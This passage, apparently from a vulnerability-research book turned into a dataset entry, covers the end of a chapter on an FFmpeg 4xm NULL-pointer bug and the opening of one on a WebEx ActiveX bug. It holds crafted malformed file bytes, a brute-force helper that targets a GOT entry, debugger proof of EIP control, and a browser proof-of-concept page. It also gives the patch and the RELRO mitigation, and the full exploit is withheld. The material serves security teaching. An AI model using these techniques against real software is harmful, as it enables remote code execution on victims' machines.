4-7 length of strk structure (40 or 0x28 bytes)\nbytes 8-11 track number\nbytes 12-15 audio type: 0 = PCM, 1 = 4X IMA ADPCM\nbytes 16-35 unknown\nbytes 36-39 number of audio channels\nbytes 40-43 audio sample rate\nbytes 44-47 audio sample resolution (8 or 16 bits)\nThe strk chunk of the downloaded sample file starts at file offset\n0x1a6, as shown in Figure 4-4:\n&header[i]\n(1) (2) (3)\n000001a0h: 32 2E 77 61 76 00 73 74 72 6B 28 00 00 00 00 00 ; 2.wav.strk(.....\n000001b0h: 00 00 00 00 00 00 00 00 04 00 D1 07 00 00 2F 00 ; ..........Ñ.../.\n(4)\nFigure 4-4: A strk chunk from the 4X movie sample file I downloaded . The numbers\nshown are referenced in Table 4-1 .\nTable 4-1 describes the layout of the strk chunk illustrated in\nFigure 4-4.\nTable 4-1: Components of strk Chunk Layout Shown in Figure 4-4\nReference Header offset Description\n(1) &header[i] fourcc: 'strk'\n(2) &header[i+4] length of strk structure (0x28 bytes)\n(3) &header[i+8] track number (this is the current_track variable from\nFFmpeg source code)\n(4) &header[i+12] audio type (this is the value that gets written at the\nfirst dereferenced memory location)\nNULL Pointer FTW 57\nTo exploit this vulnerability, I knew that I would need to set the\nvalues of track number at &header[i+8] (that corresponds to current_\ntrack from FFmpeg source code) and audio type at &header[i+12]. If\nI set the values properly, the value of audio type would be written at\nthe memory location NULL + track number, which is the same as NULL +\ncurrent_track.\nIn summary, the (nearly) arbitrary memory write operations from\nthe FFmpeg source code are as follows:\n[..]\n178 fourxm->tracks[current_track].adpcm = AV_RL32(&header[i + 12]);\n179 fourxm->tracks[current_track].channels = AV_RL32(&header[i + 36]);\n180 fourxm->tracks[current_track].sample_rate = AV_RL32(&header[i + 40]);\n181 fourxm->tracks[current_track].bits = AV_RL32(&header[i + 44]);\n[..]\nAnd each corresponds to this pseudo code:\nNULL[user_controlled_value].offset = user_controlled_data;\nStep 3: Manipulate the strk Chunk to\n← Compiling ffmpeg:\nCrash FFmpeg linux$ ./configure; make\nAfter compiling the vulnerable FFmpeg t T w h o es d e i c ff o e m re m nt a n b d in s a w ry il l v c e o rs m io p n i s le\nsource code revision 16556, I tried to con- of ffmpeg:\nvert the 4X movie into an AVI file to verify • ffmpeg binary without\nthat the compilation was successful and that debugging symbols\nFFmpeg worked flawlessly. • ffmpeg_g binary with\ndebugging symbols\nlinux$ ./ffmpeg_g -i original.4xm original.avi\nFFmpeg version SVN-r16556, Copyright (c) 2000-2009 Fabrice Bellard, et al.\nconfiguration:\nlibavutil 49.12. 0 / 49.12. 0\nlibavcodec 52.10. 0 / 52.10. 0\nlibavformat 52.23. 1 / 52.23. 1\nlibavdevice 52. 1. 0 / 52. 1. 0\nbuilt on Jan 24 2009 02:30:50, gcc: 4.3.3\nInput #0, 4xm, from 'original.4xm':\nDuration: 00:00:13.20, start: 0.000000, bitrate: 704 kb/s\nStream #0.0: Video: 4xm, rgb565, 640x480, 15.00 tb(r)\nStream #0.1: Audio: pcm_s16le, 22050 Hz, stereo, s16, 705 kb/s\nOutput #0, avi, to 'original.avi':\nStream #0.0: Video: mpeg4, yuv420p, 640x480, q=2-31, 200 kb/s, 15.00 tb(c)\nStream #0.1: Audio: mp2, 22050 Hz, stereo, s16, 64 kb/s\nStream mapping:\nStream #0.0 -> #0.0\nStream #0.1 -> #0.1\nPress [q] to stop encoding\nframe= 47 fps= 0 q=2.3 Lsize= 194kB time=3.08 bitrate= 515.3kbits/s\nvideo:158kB audio:24kB global headers:0kB muxing overhead 6.715897%\n58 Chapter 4\nNext, I modified the values of track number as well as audio type in\nthe strk chunk of the sample file.\nAs illustrated in Figure 4-5, I changed the value of track number to\n0xaaaaaaaa (1) and the value of audio type to 0xbbbbbbbb (2). I named\nthe new file poc1.4xm and tried to convert it with FFmpeg (see Sec-\ntion B.4 for a description of the following debugger commands).\n&header[i]\n(1)\n000001a0h: 32 2E 77 61 76 00 73 74 72 6B 28 00 00 00 AA AA ; 2.wav.strk(... ªª\n000001b0h: AA AA BB BB BB BB 00 00 04 00 D1 07 00 00 2F 00 ; ªª»»»»....Ñ.../.\n(2)\nFigure 4-5: The strk chunk of the sample file after I altered it . The changes I made are\nhighlighted and framed, and the numbers shown are referenced in the text above .\nlinux$ gdb ./ffmpeg_g\nGNU gdb 6.8-debian\nCopyright (C) 2008 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law. Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"i486-linux-gnu\"...\n(gdb) set disassembly-flavor intel\n(gdb) run -i poc1.4xm\nStarting program: /home/tk/BHD/ffmpeg/ffmpeg_g -i poc1.4xm\nFFmpeg version SVN-r16556, Copyright (c) 2000-2009 Fabrice Bellard, et al.\nconfiguration:\nlibavutil 49.12. 0 / 49.12. 0\nlibavcodec 52.10. 0 / 52.10. 0\nlibavformat 52.23. 1 / 52.23. 1\nlibavdevice 52. 1. 0 / 52. 1. 0\nbuilt on Jan 24 2009 02:30:50, gcc: 4.3.3\nProgram received signal SIGSEGV, Segmentation fault.\n0x0809c89d in fourxm_read_header (s=0x8913330, ap=0xbf8b6c24) at\nlibavformat/4xm.c:178\n178 fourxm->tracks[current_track].adpcm = AV_RL32(&header[i + 12]);\nAs expected, FFmpeg crashed with a segmentation fault at source\ncode line 178. I further analyzed the FFmpeg process within the debug-\nger to see what exactly caused the crash.\n(gdb) info registers\neax 0xbbbbbbbb -1145324613\necx 0x891c400 143770624\nedx 0x0 0\nNULL Pointer FTW 59\nebx 0xaaaaaaaa -1431655766\nesp 0xbf8b6aa0 0xbf8b6aa0\nebp 0x55555548 0x55555548\nesi 0x891c3c0 143770560\nedi 0x891c340 143770432\neip 0x809c89d 0x809c89d <fourxm_read_header+509>\neflags 0x10207 [ CF PF IF RF ]\ncs 0x73 115\nss 0x7b 123\nds 0x7b 123\nes 0x7b 123\nfs 0x0 0\ngs 0x33 51\nAt the time of the crash, the registers EAX and EBX were filled with\nthe values that I input for audio type (0xbbbbbbbb) and track number\n(0xaaaaaaaa). Next, I asked the debugger to display the last instruction\nexecuted by FFmpeg:\n(gdb) x/1i $eip\n0x809c89d <fourxm_read_header+509>: mov DWORD PTR [edx+ebp*1+0x10],eax\nAs the debugger output shows, the instruction that caused the\nsegmentation fault was attempting to write the value 0xbbbbbbbb at an\naddress calculated using my value for track number.\nTo control the memory write, I needed to know how the destina-\ntion address of the write operation was calculated. I found the answer\nby looking at the following assembly code:\n(gdb) x/7i $eip - 21\n0x809c888 <fourxm_read_header+488>: lea ebp,[ebx+ebx*4]\n0x809c88b <fourxm_read_header+491>: mov eax,DWORD PTR [esp+0x34]\n0x809c88f <fourxm_read_header+495>: mov edx,DWORD PTR [esi+0x10]\n0x809c892 <fourxm_read_header+498>: mov DWORD PTR [esp+0x28],ebp\n0x809c896 <fourxm_read_header+502>: shl ebp,0x2\n0x809c899 <fourxm_read_header+505>: mov eax,DWORD PTR [ecx+eax*1+0xc]\n0x809c89d <fourxm_read_header+509>: mov DWORD PTR [edx+ebp*1+0x10],eax\nThese instructions correspond to the following C source line:\n[..]\n178 fourxm->tracks[current_track].adpcm = AV_RL32(&header[i + 12]);\n[..]\nTable 4-2 explains the results of these instructions.\nSince EBX contains the value I supplied for current_track and EDX\ncontains the NULL pointer of fourxm->tracks, the calculation can be\nexpressed as this:\nedx + ((ebx + ebx * 4) << 2) + 0x10 = destination address of the write operation\n60 Chapter 4\nTable 4-2: List of the Assembler Instructions and the Result of Each Instruction\nInstruction Result\nlea ebp,[ebx+ebx*4] ebp = ebx + ebx * 4\n(The EBX register contains the user-defined\nvalue of current_track (0xaaaaaaaa) .)\nmov eax,DWORD PTR [esp+0x34] eax = array index i\nmov edx,DWORD PTR [esi+0x10] edx = fourxm->tracks\nshl ebp,0x2 ebp = ebp << 2\nmov eax,DWORD PTR eax = AV_RL32(&header[i + 12]); or\n[ecx+eax*1+0xc] eax = ecx[eax + 0xc];\nmov DWORD PTR fourxm->tracks[current_track].adpcm = eax; or\n[edx+ebp*1+0x10],eax edx[ebp + 0x10] = eax;\nOr in a more simplified form:\nedx + (ebx * 20) + 0x10 = destination address of the write operation\nI supplied the value 0xaaaaaaaa for current_track (EBX register), so\nthe calculation should look like this:\nNULL + (0xaaaaaaaa * 20) + 0x10 = 0x55555558\nThe result of 0x55555558 can be confirmed with the help of the\ndebugger:\n(gdb) x/1x $edx+$ebp+0x10\n0x55555558: Cannot access memory at address 0x55555558\nStep 4: Manipulate the strk Chunk to Gain Control over EIP\nThe vulnerability allowed me to overwrite nearly arbitrary memory\naddresses with any 4-byte value. To gain control of the execution flow\nof FFmpeg, I had to overwrite a memory location that would allow me\nto control the EIP register. I had to find a stable address, one that was\npredictable within the address space of FFmpeg. That ruled out all\nstack addresses of the process. But the Executable and Linkable Format\n(ELF ) used by Linux provides an almost perfect target: the Global Off-\nset Table (GOT ). Every library function used in FFmpeg has a reference\nin the GOT. By manipulating GOT entries, I could easily gain control\nof the execution flow (see Section A.4). The good thing about the\nGOT is that it’s predictable, which is exactly what I needed. I could\ngain control of EIP by overwriting the GOT entry of a library function\nthat is called after the vulnerability happens.\nNULL Pointer FTW 61\nSo, what library function is called after the arbitrary memory\nwrites? To answer this question, I had a look at the source code again:\nSource code file libavformat/4xm.c\nFunction fourxm_read_header()\n[..]\n184 /* allocate a new AVStream */\n185 st = av_new_stream(s, current_track);\n[..]\nDirectly after the four memory-write operations, a new AVStream is\nallocated using the function av_new_stream().\nSource code file libavformat/utils.c\nFunction av_new_stream()\n[..]\n2271 AVStream *av_new_stream(AVFormatContext *s, int id)\n2272 {\n2273 AVStream *st;\n2274 int i;\n2275\n2276 if (s->nb_streams >= MAX_STREAMS)\n2277 return NULL;\n2278\n2279 st = av_mallocz(sizeof(AVStream));\n[..]\nIn line 2279 another function named av_mallocz() is called.\nSource code file libavutil/mem.c\nFunctions av_mallocz() and av_malloc()\n[..]\n43 void *av_malloc(unsigned int size)\n44 {\n45 void *ptr = NULL;\n46 #ifdef CONFIG_MEMALIGN_HACK\n47 long diff;\n48 #endif\n49\n50 /* let's disallow possible ambiguous cases */\n51 if(size > (INT_MAX-16) )\n52 return NULL;\n53\n54 #ifdef CONFIG_MEMALIGN_HACK\n55 ptr = malloc(size+16);\n56 if(!ptr)\n57 return ptr;\n58 diff= ((-(long)ptr - 1)&15) + 1;\n59 ptr = (char*)ptr + diff;\n60 ((char*)ptr)[-1]= diff;\n61 #elif defined (HAVE_POSIX_MEMALIGN)\n62 posix_memalign(&ptr,16,size);\n62 Chapter 4\n63 #elif defined (HAVE_MEMALIGN)\n64 ptr = memalign(16,size);\n[..]\n135 void *av_mallocz(unsigned int size)\n136 {\n137 void *ptr = av_malloc(size);\n138 if (ptr)\n139 memset(ptr, 0, size);\n140 return ptr;\n141 }\n[..]\nIn line 137 the function av_malloc() is called, and it calls memalign()\nin line 64 (the other ifdef cases—lines 54 and 61—are not defined\nwhen using the Ubuntu Linux 9.04 platform). I was excited to see\nmemalign() because it was exactly what I was looking for: a library\nfunction that’s called directly after the vulnerability happens (see\nFigure 4-6).\nFFmpeg internal\nfunction\nfourxm_read_header() av_new_stream() av_mallocz() av_malloc()\nfunction with FFmpeg internal FFmpeg internal\nvulnerability function function\nmemalign()\nlibrary function\nFigure 4-6: A call graph showing the path from the vulnerable function to memalign()\nThat brought me to the next question: What is the address of the\nGOT entry of memalign() in FFmpeg?\nI gained this information with the help of objdump:\nlinux$ objdump -R ffmpeg_g | grep memalign\n08560204 R_386_JUMP_SLOT posix_memalign\nSo the address I had to overwrite was 0x08560204. All I had to do\nwas calculate an appropriate value for track number (current_track).\nI could get that value in either of two ways: I could try to calculate it,\nor I could use brute force. I chose the easy option and wrote the fol-\nlowing program:\n01 #include <stdio.h>\n02\n03 // GOT entry address of memalign()\n04 #define MEMALIGN_GOT_ADDR 0x08560204\n05\n06 // Min and max value for 'current_track’\nNULL Pointer FTW 63\n07 #define SEARCH_START 0x80000000\n08 #define SEARCH_END 0xFFFFFFFF\n09\n10 int\n11 main (void)\n12 {\n13 unsigned int a, b = 0;\n14\n15 for (a = SEARCH_START; a < SEARCH_END; a++) {\n16 b = (a * 20) + 0x10;\n17 if (b == MEMALIGN_GOT_ADDR) {\n18 printf (\"Value for 'current_track': %08x\\n\", a);\n19 return 0;\n20 }\n21 }\n22\n23 printf (\"No valid value for 'current_track' found.\\n\");\n24\n25 return 1;\n26 }\nListing 4-1: Little helper program to use brute force to find the appropriate value for current_track\n(addr_brute_force.c)\nThe program illustrated in Listing 4-1 uses brute force to find\nan appropriate track number (current_track) value, which is needed\nto overwrite the (GOT) address defined in line 4. This is done by\ntrying all possible values for current_track until the result of the calcula-\ntion (see line 16) matches the searched GOT entry address of m emalign()\n(see line 17). To trigger the vulnerability, current_track has to be\ninterpreted as negative, so only values in the range of 0x80000000\nto 0xffffffff are considered (see line 15).\nExample:\nlinux$ gcc -o addr_brute_force addr_brute_force.c\nlinux$ ./addr_brute_force\nValue for 'current_track': 8d378019\nI then adjusted the sample file and renamed it poc2.4xm.\nThe only thing I changed was the value of track number (see (1) in\nFigure 4-7). It now matched the value generated by my little helper\nprogram.\n(1)\n000001a0h: 32 2E 77 61 76 00 73 74 72 6B 28 00 00 00 19 80 ; 2.wav.strk(....€\n000001b0h: 37 8D BB BB BB BB 00 00 04 00 D1 07 00 00 2F 00 ; 7 »»»»....Ñ.../.\nFigure 4-7: The strk chunk of poc2.4xm after I adjusted the track number (current_track)\nI then tested the new proof-of-concept file in the debugger (see\nSection B.4 for a description of the following debugger commands).\n64 Chapter 4\nlinux$ gdb -q ./ffmpeg_g\n(gdb) run -i poc2.4xm\nStarting program: /home/tk/BHD/ffmpeg/ffmpeg_g -i poc2.4xm\nFFmpeg version SVN-r16556, Copyright (c) 2000-2009 Fabrice Bellard, et al.\nconfiguration:\nlibavutil 49.12. 0 / 49.12. 0\nlibavcodec 52.10. 0 / 52.10. 0\nlibavformat 52.23. 1 / 52.23. 1\nlibavdevice 52. 1. 0 / 52. 1. 0\nbuilt on Jan 24 2009 02:30:50, gcc: 4.3.3\nProgram received signal SIGSEGV, Segmentation fault.\n0xbbbbbbbb in ?? ()\n(gdb) info registers\neax 0xbfc1ddd0 -1077813808\necx 0x9f69400 167154688\nedx 0x9f60330 167117616\nebx 0x0 0\nesp 0xbfc1ddac 0xbfc1ddac\nebp 0x85601f4 0x85601f4\nesi 0x164 356\nedi 0x9f60330 167117616\neip 0xbbbbbbbb 0xbbbbbbbb\neflags 0x10293 [ CF AF SF IF RF ]\ncs 0x73 115\nss 0x7b 123\nds 0x7b 123\nes 0x7b 123\nfs 0x0 0\ngs 0x33 51\nBingo! Full control over EIP. After I gained control over the instruc-\ntion pointer, I developed an exploit for the vulnerability. I used the\nVLC media player as an injection vector, because it uses the vulner-\nable version of FFmpeg.\nAs I’ve said in previous chapters, the laws in Germany do not allow\nme to provide a full working exploit, but you can watch a short video I\nrecorded that shows the exploit in action on the book’s website.5\nFigure 4-8 summarizes the steps I used to exploit the vulnerability.\nHere is the anatomy of the bug shown in this figure:\n1. The destination address for the memory write is calculated while\nusing current_track as an index (NULL + current_track + offset). The\nvalue of current_track derives from user-controlled data of the\n4xm media file.\n2. The source data of the memory write derives from user-controlled\ndata of the media file.\n3. The user-controlled data is copied at the memory location of the\nmemalign() GOT entry.\nNULL Pointer FTW 65\nprocess of\nFFmpeg\nfourxm->tracks[current_track].adpcm =\nAV_RL32(&header[i + 12]);\n(3)\n4xm file\nwritable (2)\narea GOT: memalign() (1)\n+ current_track\n+ offset\nNULL\nFigure 4-8: Diagram of my exploitation of the FFmpeg bug\n4.3 Vulnerability remediation\nTuesday, January 27, 2009\nAfter I told the FFmpeg maintainers about the bug, they developed the\nfollowing patch:6\n--- a/libavformat/4xm.c\n+++ b/libavformat/4xm.c\n@@ -166,12 +166,13 @@ static int fourxm_read_header(AVFormatContext *s,\ngoto fail;\n}\ncurrent_track = AV_RL32(&header[i + 8]);\n+ if((unsigned)current_track >= UINT_MAX / sizeof(AudioTrack) - 1){\n+ av_log(s, AV_LOG_ERROR, \"current_track too large\\n\");\n+ ret= -1;\n+ goto fail;\n+ }\nif (current_track + 1 > fourxm->track_count) {\nfourxm->track_count = current_track + 1;\n- if((unsigned)fourxm->track_count >= UINT_MAX / sizeof(AudioTrack)){\n- ret= -1;\n- goto fail;\n- }\nfourxm->tracks = av_realloc(fourxm->tracks,\nfourxm->track_count * sizeof(AudioTrack));\nif (!fourxm->tracks) {\nThe patch applies a new length check that restricts the maximum\nvalue for current_track to 0x09249247.\n66 Chapter 4\n(UINT_MAX / sizeof(AudioTrack) - 1) - 1 = maximum allowed value for current_track\n(0xffffffff / 0x1c - 1) - 1 = 0x09249247\nWhen the patch is in place, current_track can’t become negative,\nand the vulnerability is indeed fixed.\nThis patch eliminated the vulnerability at the source code level.\nThere’s also a generic exploit mitigation technique that would make\nit much harder to exploit the bug. To gain control of the execution\nflow, I had to overwrite a memory location to gain control over EIP. In\nthis example, I used a GOT entry. The RELRO mitigation technique\nSee →\nSection C.2 has an operation mode called Full RELRO that (re)maps the GOT as\nfor more read-only, thus making it impossible to use the described GOT over-\ninformation\nwrite technique to gain control of the execution flow of FFmpeg. How-\non the RELRO\never, other exploitation techniques that are not mitigated by RELRO\nmitigation\ntechnique. would still allow control over EIP.\nTo make use of the Full RELRO mitigation technique, the\nFFmpeg binary would need to be recompiled with the following\nadditional linker options: -Wl,-z,relro,-z,now.\nExample of recompiling FFmpeg with Full RELRO support:\nlinux$ ./configure --extra-ldflags=\"-Wl,-z,relro,-z,now\"\nlinux$ make\nGet GOT entry of memalign():\nlinux$ objdump -R ./ffmpeg_g | grep memalign\n0855ffd0 R_386_JUMP_SLOT posix_memalign\nAdjust Listing 4-1 and use brute force to get the value for\ncurrent_track:\nlinux$ ./addr_brute_force\nValue for 'current_track': 806ab330\nMake a new proof-of-concept file (poc_relro.4xm) and test it in the\ndebugger (see Section B.4 for a description of the following debugger\ncommands):\nlinux$ gdb -q ./ffmpeg_g\n(gdb) set disassembly-flavor intel\n(gdb) run -i poc_relro.4xm\nStarting program: /home/tk/BHD/ffmpeg_relro/ffmpeg_g -i poc_relro.4xm\nFFmpeg version SVN-r16556, Copyright (c) 2000-2009 Fabrice Bellard, et al.\nconfiguration: --extra-ldflags=-Wl,-z,relro,-z,now\nlibavutil 49.12. 0 / 49.12. 0\nlibavcodec 52.10. 0 / 52.10. 0\nNULL Pointer FTW 67\nlibavformat 52.23. 1 / 52.23. 1\nlibavdevice 52. 1. 0 / 52. 1. 0\nbuilt on Jan 24 2009 09:07:58, gcc: 4.3.3\nProgram received signal SIGSEGV, Segmentation fault.\n0x0809c89d in fourxm_read_header (s=0xa836330, ap=0xbfb19674) at\nlibavformat/4xm.c:178\n178 fourxm->tracks[current_track].adpcm = AV_RL32(&header[i + 12]);\nFFmpeg crashed again while trying to parse the malformed media\nfile. To see what exactly caused the crash, I asked the debugger to dis-\nplay the current register values as well as the last instruction executed\nby FFmpeg:\n(gdb) info registers\neax 0xbbbbbbbb -1145324613\necx 0xa83f3e0 176419808\nedx 0x0 0\nebx 0x806ab330 -2140490960\nesp 0xbfb194f0 0xbfb194f0\nebp 0x855ffc0 0x855ffc0\nesi 0xa83f3a0 176419744\nedi 0xa83f330 176419632\neip 0x809c89d 0x809c89d <fourxm_read_header+509>\neflags 0x10206 [ PF IF RF ]\ncs 0x73 115\nss 0x7b 123\nds 0x7b 123\nes 0x7b 123\nfs 0x0 0\ngs 0x33 51\n(gdb) x/1i $eip\n0x809c89d <fourxm_read_header+509>: mov DWORD PTR [edx+ebp*1+0x10],eax\nI also displayed the address where FFmpeg had attempted to store\nthe value of EAX:\n(gdb) x/1x $edx+$ebp+0x10\n0x855ffd0 <_GLOBAL_OFFSET_TABLE_+528>: 0xb7dd4d40\nAs expected, FFmpeg tried to write the value of EAX to the sup-\nplied address (0x855ffd0) of memalign()’s GOT entry.\n(gdb) shell cat /proc/$(pidof ffmpeg_g)/maps\n08048000-0855f000 r-xp 00000000 08:01 101582 /home/tk/BHD/ffmpeg_relro/ffmpeg_g\n0855f000-08560000 r--p 00516000 08:01 101582 /home/tk/BHD/ffmpeg_relro/ffmpeg_g\n08560000-0856c000 rw-p 00517000 08:01 101582 /home/tk/BHD/ffmpeg_relro/ffmpeg_g\n0856c000-0888c000 rw-p 0856c000 00:00 0\n0a834000-0a855000 rw-p 0a834000 00:00 0 [heap]\nb7d60000-b7d61000 rw-p b7d60000 00:00 0\nb7d61000-b7ebd000 r-xp 00000000 08:01 148202 /lib/tls/i686/cmov/libc-2.9.so\nb7ebd000-b7ebe000 ---p 0015c000 08:01 148202 /lib/tls/i686/cmov/libc-2.9.so\n68 Chapter 4\nb7ebe000-b7ec0000 r--p 0015c000 08:01 148202 /lib/tls/i686/cmov/libc-2.9.so\nb7ec0000-b7ec1000 rw-p 0015e000 08:01 148202 /lib/tls/i686/cmov/libc-2.9.so\nb7ec1000-b7ec5000 rw-p b7ec1000 00:00 0\nb7ec5000-b7ec7000 r-xp 00000000 08:01 148208 /lib/tls/i686/cmov/libdl-2.9.so\nb7ec7000-b7ec8000 r--p 00001000 08:01 148208 /lib/tls/i686/cmov/libdl-2.9.so\nb7ec8000-b7ec9000 rw-p 00002000 08:01 148208 /lib/tls/i686/cmov/libdl-2.9.so\nb7ec9000-b7eed000 r-xp 00000000 08:01 148210 /lib/tls/i686/cmov/libm-2.9.so\nb7eed000-b7eee000 r--p 00023000 08:01 148210 /lib/tls/i686/cmov/libm-2.9.so\nb7eee000-b7eef000 rw-p 00024000 08:01 148210 /lib/tls/i686/cmov/libm-2.9.so\nb7efc000-b7efe000 rw-p b7efc000 00:00 0\nb7efe000-b7eff000 r-xp b7efe000 00:00 0 [vdso]\nb7eff000-b7f1b000 r-xp 00000000 08:01 130839 /lib/ld-2.9.so\nb7f1b000-b7f1c000 r--p 0001b000 08:01 130839 /lib/ld-2.9.so\nb7f1c000-b7f1d000 rw-p 0001c000 08:01 130839 /lib/ld-2.9.so\nbfb07000-bfb1c000 rw-p bffeb000 00:00 0 [stack]\nThis time FFmpeg crashed with a segmentation fault while trying\nto overwrite the read-only GOT entry (see the r--p permissions of the\nGOT at 0855f000-08560000). It seems that Full RELRO can indeed suc-\ncessfully mitigate GOT overwrites.\n4.4 lessons learned\nAs a programmer:\n• Don’t mix different data types.\n• Learn about the hidden transformations done automatically by\nthe compiler. These implicit conversions are subtle and cause a\nlot of security bugs7 (also see Section A.3).\n• Get a solid grasp of C’s type conversions.\n• Not all NULL pointer dereferences in user space are simple\ndenial-of-service conditions. Some of them are really bad vulner-\nabilities that can lead to arbitrary code execution.\n• Full RELRO helps to mitigate the GOT overwrite exploitation\ntechnique.\nAs a user of media players:\n• Never trust media file extensions (see Section 2.5).\n4.5 Addendum\nWednesday, January 28, 2009\nThe vulnerability was fixed (Figure 4-9 shows the timeline) and a new\nversion of FFmpeg is available, so I released a detailed security advi-\nsory on my website.8 The bug was assigned CVE-2009-0385.\nNULL Pointer FTW 69\nPatch developed by\nFFmpeg maintainers\nFFmpeg maintainers\nnotified\nFixed version of\nRelease date of my\nFFmpeg available\nsecurity advisory\n01.27.2009 01.28.2009\nFigure 4-9: Timeline of the FFmpeg bug from notification to the release of a fixed version\nof FFmpeg\nnotes\n1. See http://wiki.multimedia.cx/index.php?title=YouTube.\n2. See http://ffmpeg.org/download.html.\n3. See http://www.trapkit.de/books/bhd/.\n4. A detailed description of the 4X movie file format can be found at http://\nwiki.multimedia.cx/index.php?title=4xm_Format.\n5. See http://www.trapkit.de/books/bhd/.\n6. The patch from the FFmpeg maintainers can be found at http://git.videolan\n.org/?p=ffmpeg.git;a=commitdiff;h=0838cfdc8a10185604db5cd9d6bffad71279a0e8.\n7. For more information on type conversions and associated security problems\nconsult Mark Dowd, John McDonald, and Justin Schuh, The Art of Software\nSecurity Assessment: Identifying and Preventing Software Vulnerabilities (India-\nnapolis, IN: Addison-Wesley Professional, 2007). See also the sample chapter\navailable at http://ptgmedia.pearsoncmg.com/images/0321444426/samplechapter/\nDowd_ch06.pdf.\n8. My security advisory that describes the details of the FFmpeg vulnerability\ncan be found at http://www.trapkit.de/advisories/TKADV2009-004.txt.\n70 Chapter 4",
    "question": "What is the key concept discussed in the text regarding the FFmpeg vulnerability and how can it be exploited?",
    "summary": "The text discusses a type conversion vulnerability in the FFmpeg library that allows arbitrary code execution by exploiting a NULL pointer dereference. The bug occurs when an unsigned integer is converted to a signed integer, leading to a negative value that causes a buffer allocation to fail. This results in writing data to a NULL pointer, which can be used to overwrite memory locations. The vulnerability was fixed with a patch that restricts the maximum value for the current_track variable. The exploit involves manipulating the strk chunk of a 4X movie file to gain control over the EIP register. The text also mentions that the Full RELRO mitigation technique can help prevent such exploits by making the GOT read-only."
  },
  {
    "start": 36,
    "end": 40,
    "text": "5\nBrowse AnD you’re owneD\nSunday, April 6, 2008\nDear Diary,\nVulnerabilities in browsers and browser add-ons are all the rage these\ndays, so I decided to have a look at some ActiveX controls. The first\none on my list was Cisco’s online meeting and web-conferencing soft-\nware called WebEx, which is widely used in business. After spending\nsome time reverse engineering the WebEx ActiveX control for Micro-\nsoft’s Internet Explorer, I found an obvious bug that I could have\nfound in a few seconds if I had fuzzed the control instead of reading\nthe assembly. Fail.\n☺\n5.1 Vulnerability Discovery\nI used the following process to search for a\nvulnerability: ← I used Windows\nxP SP3 32-bit and\n• Step 1: List the registered WebEx objects and Internet Explorer 6\nexported methods. as the platform for\nall the following steps.\n• Step 2: Test the exported methods in the\nbrowser.\n• Step 3: Find the object methods in the binary.\n• Step 4: Find the user-controlled input values.\n• Step 5: Reverse engineer the object methods.\nnote A download link for the vulnerable version of WebEx Meeting\nManager can be found at http://www.trapkit.de/books/bhd/.\nStep 1: List the Registered WebEx Objects and Exported Methods\nAfter downloading and installing the WebEx Meeting Manager soft-\nware, I fired up COMRaider1 to generate a list of the exported inter-\nfaces the control provides to the caller. I clicked the Start button in\nCOMRaider and selected Scan a directory for registered COM servers\nto test the WebEx components installed in C:\\Program Files\\Webex\\ .\nAs Figure 5-1 illustrates, two objects are registered in the WebEx\ninstall directory, and the object with GUID {32E26FD9-F435-4A20-A561-\n35D4B987CFDC} and ProgID WebexUCFObject.WebexUCFObject.1 implements\nIObjectSafety. Internet Explorer will trust this object since it’s marked\nas safe for initialization and safe for scripting. That makes the object a\npromising target for “browse and you’re owned” attacks, since it’s\npossible to call its methods from within a web page.2\nFigure 5-1: Registered WebEx objects in COMRaider\nMicrosoft also provides a handy C# class called ClassId.cs 3 that lists\nvarious properties of ActiveX controls. To use that class, I added the\nfollowing lines to the source file and compiled it with the command-\nline version of Visual Studio’s C# compiler (csc):\n[..]\nnamespace ClassId\n{\nclass ClassId\n{\nstatic void Main(string[] args)\n72 Chapter 5\n{\nSWI.ClassId_q.ClassId clsid = new SWI.ClassId_q.ClassId();\nif (args.Length == 0 || (args[0].Equals(“/?\") == true ||\nargs[0].ToLower().StartsWith(\"-h\") == true) ||\nargs.Length < 1)\n{\nConsole.WriteLine(\"Usage: ClassID.exe <CLSID>\\n\");\nreturn;\n}\nclsid.set_clsid(args[0]);\nSystem.Console.WriteLine(clsid.ToString());\n}\n}\n}\nTo compile and use the tool, I ran the following commands in a\ncommand-prompt window:\nC:\\Documents and Settings\\tk\\Desktop>csc /warn:0 /nologo ClassId.cs\nC:\\Documents and Settings\\tk\\Desktop>ClassId.exe {32E26FD9-F435-4A20-A561-35D4B987CFDC}\nClsid: {32E26FD9-F435-4A20-A561-35D4B987CFDC}\nProgid: WebexUCFObject.WebexUCFObject.1\nBinary Path: C:\\Program Files\\WebEx\\WebEx\\824\\atucfobj.dll\nImplements IObjectSafety: True\nSafe For Initialization (IObjectSafety): True\nSafe For Scripting (IObjectSafety): True\nSafe For Initialization (Registry): False\nSafe For Scripting (Registry): False\nKillBitted: False\nThe output of the tool shows that the object was indeed marked\nas safe for initialization and safe for scripting using IObjectSafety.\nI then clicked the Select button in COMRaider to see a list of\nthe public methods exported by the object with GUID {32E26FD9-F435-\n4A20-A561-35D4B987CFDC}. As illustrated in Figure 5-2, a method called\nNewObject() is exported by the object and takes a string value as input.\nFigure 5-2: Public methods exported by the object with GUID {32E26FD9-F435-4A20-\nA561-35D4B987CFDC} .\nBrowse and You’re Owned 73\nStep 2: Test the Exported Methods in the Browser\nAfter I generated lists of the available objects and exported methods,\nI wrote a little HTML file that calls the NewObject() method with the\nhelp of VBScript:\n01 <html>\n02 <title>WebEx PoC 1</title>\n03 <body>\n04 <object classid=\"clsid:32E26FD9-F435-4A20-A561-35D4B987CFDC\" id=\"obj\"></object>\n05 <script language='vbscript'>\n06 arg = String(12, \"A\")\n07 obj.NewObject arg\n08 </script>\n09 </body>\n10 </html>\nListing 5-1: HTML file to call the NewObject() method (webex_poc1.html )\nIn line 4 of Listing 5-1, the object with GUID or ClassID {32E26FD9-\nF435-4A20-A561-35D4B987CFDC} is instantiated. In line 7 the NewObject()\nmethod is called with a string value of 12 As as a parameter.\nTo test the HTML file, I implemented a little web server in Python\nthat would serve the webex_poc1.html file to the browser (see Listing 5-2):\n01 import string,cgi\n02 from os import curdir, sep\n03 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer\n04\n05 class WWWHandler(BaseHTTPRequestHandler):\n06\n07 def do_GET(self):\n08 try:\n09 f = open(curdir + sep + \"webex_poc1.html\")\n10\n11 self.send_response(200)\n12 self.send_header('Content-type', 'text/html')\n13 self.end_headers()\n14 self.wfile.write(f.read())\n15 f.close()\n16\n17 return\n18\n19 except 